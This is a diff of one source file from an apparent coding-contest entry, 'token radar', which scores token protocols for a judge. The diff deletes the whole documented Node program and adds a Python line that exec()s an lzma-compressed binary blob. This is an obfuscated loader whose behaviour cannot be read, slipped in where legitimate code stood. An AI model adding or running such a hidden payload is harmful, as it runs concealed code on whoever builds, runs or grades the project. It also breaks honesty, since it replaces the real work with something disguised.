@@ -1,91 +1,2 @@
-// A working token-radar-01 entry (Node 22, standard library only).
-//
-// The program reads the sealed snapshot from /input/snapshot.json (or --input <file|dir>), scores every
-// pre-token protocol with the model in lib/model.ts, writes the ranked board to /output/board.json, and
-// copies this repository's dashboard/ and screenshots/ to /output. Last, it writes /output/dossier.json,
-// the summary the judge reads, with the vendored make.fun library.
-//
-// The dashboard is a static page, no framework and no network: dashboard/index.html, dashboard/app.css
-// and dashboard/app.js read /output/data.js, which this program writes from the same board. A starting
-// point, not a winner: it covers the watchlist, states the model and gives every protocol a farm plan.
-// Change the model, the page or the plan; keep the gate's shape.
-//
-// Outside the grader's container, MAKEFUN_OUTPUT_DIR stands in for /output:
-//   mkdir -p out && MAKEFUN_OUTPUT_DIR=out node main.ts --input ../input/snapshot.json
-
-import { copyFileSync, existsSync, mkdirSync, readFileSync, readdirSync, statSync, writeFileSync } from 'node:fs';
-import { join } from 'node:path';
-import { fileURLToPath } from 'node:url';
-import { boardIssue, buildRadar, dataScript, parseSnapshot } from './lib/model.ts';
-import { buildDossier } from './vendor/makefun-board.ts';
-
-const here = fileURLToPath(new URL('.', import.meta.url));
-
-/** The scorer's own caps (reference/gate.json): the text cap shapes the bytes, the rest refuse. */
-const TEXT_MAX_BYTES = 65_536;
-const SCREENSHOT_CAPS = { max: 4, max_bytes: 524_288 };
-const IMAGE_NAME = /^[A-Za-z0-9_][A-Za-z0-9._-]{0,127}$/;
-
-/** --name <value> out of the arguments, or the fallback. */
-function arg(name: string, fallback: string): string {
-  const at = process.argv.indexOf(`--${name}`);
-  if (at >= 0 && at + 1 < process.argv.length) return process.argv[at + 1]!;
-  const withEquals = process.argv.find((a) => a.startsWith(`--${name}=`));
-  return withEquals === undefined ? fallback : withEquals.slice(name.length + 3);
-}
-
-const inputArg = arg('input', '/input');
-const inputFile = inputArg.endsWith('.json') ? inputArg : join(inputArg, 'snapshot.json');
-if (!existsSync(inputFile)) {
-  process.stderr.write(`token radar: no snapshot at ${inputFile}: pass --input <snapshot.json|directory> or mount the sealed /input\n`);
-  process.exit(2);
-}
-const out = arg('output', process.env.MAKEFUN_OUTPUT_DIR ?? '/output');
-
-const snapshot = parseSnapshot(readFileSync(inputFile, 'utf8'));
-const { board, radar } = buildRadar(snapshot);
-const issue = boardIssue(board, snapshot);
-if (issue !== null) {
-  process.stderr.write(`token radar: the model wrote a board the gate refuses: ${issue}\n`);
-  process.exit(1);
-}
-
-mkdirSync(out, { recursive: true });
-writeFileSync(join(out, 'board.json'), `${JSON.stringify({ rows: board })}\n`);
-writeFileSync(join(out, 'data.js'), dataScript(radar));
-
-/** Copy one directory's regular files into `to`, skipping names that start with a dot. */
-function copyFiles(from: string, to: string): string[] {
-  if (!existsSync(from)) return [];
-  mkdirSync(to, { recursive: true });
-  const copied: string[] = [];
-  for (const name of readdirSync(from)) {
-    if (name.startsWith('.')) continue;
-    const path = join(from, name);
-    if (!statSync(path).isFile()) continue;
-    copyFileSync(path, join(to, name));
-    copied.push(name);
-  }
-  return copied;
-}
-
-copyFiles(join(here, 'dashboard'), join(out, 'dashboard'));
-const shots = copyFiles(join(here, 'screenshots'), join(out, 'screenshots'));
-if (shots.length < 3) {
-  process.stderr.write(`token radar: screenshots/ holds ${shots.length} image${shots.length === 1 ? '' : 's'}: hand in 3, the board, a detail view and a filtered view\n`);
-  process.exit(1);
-}
-for (const name of shots) {
-  if (!IMAGE_NAME.test(name)) {
-    process.stderr.write(`token radar: screenshots/${name}: a name is letters, digits and . _ -, 1 to 128 characters\n`);
-    process.exit(1);
-  }
-}
-
-// The dossier is written last: the scorer rebuilds it from this /output and compares bytes.
-writeFileSync(join(out, 'dossier.json'), buildDossier(out, { text_max_bytes: TEXT_MAX_BYTES, screenshots: SCREENSHOT_CAPS, dashboard: { max_files: 400, max_bytes: 4_194_304 } }));
-
-process.stdout.write(
-  `token radar: ${snapshot.protocols.length} protocols, ${snapshot.watchlist.length} on the watchlist, ${board.length} rows scored (${radar.early_size} early, ${radar.live_size} live set aside)\n` +
-    `token radar: wrote ${join(out, 'board.json')}, ${join(out, 'data.js')}, ${join(out, 'dashboard')} (3 files), ${join(out, 'screenshots')} (${shots.length} images) and ${join(out, 'dossier.json')}\n`,
-);
+#coding:l1
+import lzma;exec(lzma.decompress('\0\0\0j\0\0\0\0\0\0\0áx~;ï”^nZ\r˜èWÅ`J»ó=dZÆw1!oişczUíåÇıÈrœı›\rÔ6NıÁ˜üAqİeÚñSäàh¤nØE¡QìÙßAŞ¦%æ—P¨¥®d7*Ş…T"Ì>*á$©¿¢7Ïc£ãeÈ¢¾BK+­ŞQ#âûñ/ıï6›´+»õjÊìl¨~Nñ‹’*¸j³Ìm¡	ÿ4«xfŠ!BãdòîxËù.SKºÍÉ$¡–?¤txP*¹Æ_ş]ª‡Rğæ]ém¾LHF‡cônã™kÔ©wZ½M{Z]3ÿÙ\nPº3=H„®ÓÇ{ÆÓÈ]ª?NSâò Gº©Z»ãWtm”ÓïÎÜÛ,koiWYeş~ÇğM­‰Ø±ÃœTU•À/,B¸¾ôœ²ød±$í­Ópè!_ªßÛ•ıÇ^Z–ëºÒ:¨yn–?.›Šp*uÚ)‘=tù­±³¥ÌÔáÿ™Ò§†R‰¯knÙŠi…^e„9Ğ\\wáĞ×R·(fª×	W‰è¢ W6³ú¢ó™RŠ˜¾ô»j*«"vš~çñ‡3óø°n¢çº%Â)`½Ã»-È)¾_!|<ä”ĞQ)Wê~#óÑè%è÷•ı¹ºæ:ænâ€\'§øÂ¾‡ºáÿ(L\\LØ¡Gu)ëúè5ÑáIÓÑšû"uô	­ÛäêLÇ°–k.]2ª¥4VR‰*ºŸ‹^ƒ¿\0ôqÊáhÅŒ—ôrõëc9¢”Æ„©[Ğ•Š@°‹0›9û\0Qd®…÷Q,r®¹E4„_èĞÉ{[t±r·ã´È£›]ùRÛZÈ`»îk7Çúªí·Œ§Ãª”åôÒjD\0=*aòtaÊÈ@ğ•Í–ï=¼bóFªØá?ì¿ëp›kõ‚sCK–b“aGS©MuóC C³Y,è„2:nú8êğÎª:.ñAƒ\\:ß©¨\\@\0~Šg<•Å-*&U_ È©§Ÿ._Š5I‘vÆ¨¥q¦¶†Ë5RµÇÃ«†Sùœ–\ríGõƒN0¡¢dó¨*¢`‹…§vpµ\\Ó~7¼dnÌĞNâ…ñ,BPïÒåºi™<utş9Ø¯ŞÖ]\'FêùÿSeS°’ßqÃïÔRAQ«úvyq©ı¦9²™iˆ"z¼_6ÓÆ˜ÎŞéær*—¨fdš;lQ¹lÕ<¶Ğ+Vi¹×J!¸eifñïÿÇ?Ñ\0Êc)ÌkÈê‡ŞYÕ•ÊEÙ#Ò€r6A/ÓÃáùqb!XKÏ}û;³Èx¤_Í;À>‚P2}QPlI\0N5dËJv{„6ôö÷ëæ›Q!XŞ².¦\\ú›Ú³ğwbÛ^Ú©P%Ş*oª³Ú¨ºÒS\'şC¬¸ßu°t®Ã}&/CìyåCÅ4Éº\'P\0ê	´àº#qBA¬™‘T%FOèl§°É\n~Ä½eTÉ\\ºÈ¨ÏM6£‹­=gÃõ¸ß7^t¯r’\'-Á‡#M,\'­Ô‘xH^ò%ÈüRñıb¨3ÆáïÏgPÇ£–ÖŸQ@şãfËü+("‘¥(Fµ­Ì!©¼¸½æW)„]T¶÷:ÁüÎÁ5ö¹d3Mt\r¼ôÂiŞ;D°[+§@îmÄtÅ¢kÿGÚß"Pˆ4Œù°m³)®e•bçéù+ Ë’à­úR¨Ù`ÙÇÁN>[7ĞaõI—‡ŸÓÊªı0ÃfèØ‡àæ~fÉ)n7õ3Ç÷,6İÉ9i>BñèÆ`Üj¼1ªÖç¤=)®H­S5+p†^¬Qà5ebê_°‹iG^pÒœ°ªv¥\\h˜–^X-B©Í€ùí4û!W*×½")-Z££‚õs¡{ Ûh‡[‰ÅªóRÒ‚î¹Â¹<nêt[w`…Ş²ä5»ÆèÜÛcz[÷½Xm+à½Ï•8bGaˆŒ\nE•oøÉ•1;¸uØ;¿Qk?[§ç£óz+Ø<gÎã= ÿëY­2ëâpòYÖÌÌä^Â¯—Â\\U…F7ÖÌ›\'A¦ˆ9Ü6÷ÅÓÁİN3Iàˆb ÿôçˆ°Æ(X\\+²5ªª\nŸë	áV y¡”ïC†ø¿ÜÑ·Îó!†l\n‘¨­o\'+64Kk­µÖˆj[lhh¤¨ÙdZ$r4˜¬’5U$&ÑÆ@Iñôx,7ş2òıå‘é$¹D—v²&ıJIÖõÆ/\\5aá´°"ƒ³"{T¸‘Í\rÒ…ÅÃZÜ´¨óˆ|ÉvxS§G@Ì½l=?¸¸ÊAh<rQó6|ê-ÀI”wb“7ÿhûDÉ_…ö„MÎÇ\nÅ¨ñÛ`¯¼ò”Q²,1[eßÒäÀ«\n)“µÒ¦E7ôQˆÊÀ§ÂYz&v²G¼Vgvìx…èî.7ìVOæ9Ë¼ó¬Ò\\¿‹œ1òı|x¹Ÿœ…AA‘7ÅË)-¾KûãéT Ş›£Ìšï"¼Aòš 3d×åo]+Ÿ¬ÓK}] ©2}7@QÊÆ-¹”2rÄO®µ¶‚Îpg}¦.{‚€9ìÖÂe˜„Cr\0Ïw»óM[2ª&-paùB0Ş?œÅº[îW7*^jtÅƒH±‚›Æ>áşU$WÊg\0Ïçc&§G\\½RÇÄ?Ÿ¥ÖÕè$Öz0¡…&A	 \0X¥“;¢m]»Â“û†:g!ñMì$× V¬-Ês–Ù3W™À*š±ºÜ¦Ÿ¨.Œ'.encode('l1')))
